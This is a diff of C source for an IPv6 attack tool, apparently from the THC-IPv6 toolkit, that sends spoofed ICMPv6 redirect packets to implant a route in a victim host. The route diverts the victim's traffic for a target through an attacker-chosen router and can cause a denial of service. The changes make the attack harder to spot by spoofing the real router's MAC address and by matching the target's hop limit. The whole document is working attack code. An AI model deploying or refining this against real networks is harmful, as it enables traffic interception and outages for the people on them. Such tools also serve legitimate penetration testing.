@@ -13,22 +13,24 @@
 extern int debug;
 
 void help(char *prg) {
-  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-r] interface src-ip target-ip original-router new-router [new-router-mac]\n\n", prg);
+  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("Syntax: %s [-r] interface src-ip target-ip original-router new-router [new-router-mac] [hop-limit]\n\n", prg);
   printf("Implant a route into src-ip, which redirects all traffic to target-ip to\n");
   printf("new-ip. You must know the router which would handle the route.\n");
   printf("If the new-router-mac does not exist, this results in a DOS.\n");
-  printf("Use -r to use raw mode.\n\n");
+  printf("If the TTL of the target is not 64, then specify this is the last option.\n");
+//  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
 
 int main(int argc, char *argv[]) {
-  unsigned char *pkt = NULL, buf[16], mac[7] = "", fakemac[7] = "\x00\x00\xde\xad\xbe\xef";
-  unsigned char *mac6 = mac, *src6, *target6, *oldrouter6, *newrouter6;
+  unsigned char *pkt = NULL, buf[16], mac[7] = "";
+  unsigned char *mac6 = mac, *src6, *target6, *oldrouter6, *newrouter6, *self6, *fakemac;
   int pkt_len = 0;
   thc_ipv6_hdr *ipv6;
   char *interface;
   int rawmode = 0;
+  int ttl = 64;
 
   if (argc < 6 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
@@ -45,13 +47,30 @@ int main(int argc, char *argv[]) {
   target6 = thc_resolve6(argv[3]);
   oldrouter6 = thc_resolve6(argv[4]);
   newrouter6 = thc_resolve6(argv[5]);
-  
+
+  /* Spoof source mac */
+  if ((self6 = thc_get_own_ipv6(interface, oldrouter6, PREFER_GLOBAL)) == NULL) {
+    fprintf(stderr, "Error: could not get own IP address to contact original-router\n");
+    exit(-1);
+  }
+  if ((fakemac = thc_get_mac(interface, self6, oldrouter6)) == NULL) {
+    fprintf(stderr, "Error: could not resolve mac address for original-router\n");
+    free(self6);
+    exit(-1);
+  }
+
   if (rawmode == 0) {
-    if (argv[5] != NULL)
-      sscanf(argv[5], "%x:%x:%x:%x:%x:%x", (unsigned int*)&mac[0], (unsigned int*)&mac[1], (unsigned int*)&mac[2], (unsigned int*)&mac[3], (unsigned int*)&mac[4], (unsigned int*)&mac[5]);
+    if (argv[6] != NULL)
+      sscanf(argv[6], "%x:%x:%x:%x:%x:%x", (unsigned int *) &mac[0], (unsigned int *) &mac[1], (unsigned int *) &mac[2], (unsigned int *) &mac[3], (unsigned int *) &mac[4],
+             (unsigned int *) &mac[5]);
     else
       mac6 = thc_get_own_mac(interface);
   }
+
+  if (argc >= 8)
+    ttl = atoi(argv[7]);
+  if (ttl < 0 || ttl > 255)
+    ttl = 64;
 
   memset(buf, 'A', 16);
 
@@ -64,10 +83,16 @@ int main(int argc, char *argv[]) {
     exit(-1);
   }
 
+  usleep(25000);
   ipv6 = (thc_ipv6_hdr *) pkt;
   thc_inverse_packet(ipv6->pkt + 14, ipv6->pkt_len - 14);
+  ipv6->pkt[21] = (unsigned char) ttl;
 
   thc_redir6(interface, oldrouter6, fakemac, NULL, newrouter6, mac6, ipv6->pkt + 14, ipv6->pkt_len - 14);
+  printf("Sent ICMPv6 redirect for %s\n", argv[3]);
+
+  free(self6);
+  free(fakemac);
 
   return 0;
 }
